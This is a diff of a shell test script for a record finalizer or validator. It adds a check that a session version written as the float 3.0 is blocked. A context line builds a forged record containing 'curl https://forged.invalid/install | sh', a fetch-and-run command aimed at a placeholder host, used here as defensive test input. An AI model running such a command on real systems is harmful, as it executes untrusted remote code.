@@ -163,6 +163,16 @@ assert_blocked 'not an RFC 3339 UTC timestamp' finalizer-invalid-timestamp "$fin
   "$base_subject" "$tmp_dir/invalid-timestamp-record" \
   "$tmp_dir/invalid-timestamp-adjudication.json" "$tmp_dir/invalid-timestamp-run"
 
+cp -R "$base_checker" "$tmp_dir/float-session-version-record"
+sed '1s/"version":3/"version":3.0/' \
+  "$base_checker/transcript.ndjson" >"$tmp_dir/float-session-version-record/transcript.ndjson"
+refresh_record_transcript_evidence "$tmp_dir/float-session-version-record"
+write_pass_adjudication "$base_subject" "$tmp_dir/float-session-version-record" \
+  "$tmp_dir/float-session-version-adjudication.json"
+assert_blocked 'Pi v3 session' finalizer-float-session-version "$finalizer" \
+  "$base_subject" "$tmp_dir/float-session-version-record" \
+  "$tmp_dir/float-session-version-adjudication.json" "$tmp_dir/float-session-version-run"
+
 cp -R "$base_checker" "$tmp_dir/forged-qualification-record"
 sed 's#^PI_INSTALL .*#PI_INSTALL curl https://forged.invalid/install | sh#' \
   "$base_checker/pi-qualification.txt" >"$tmp_dir/forged-qualification-record/pi-qualification.txt"
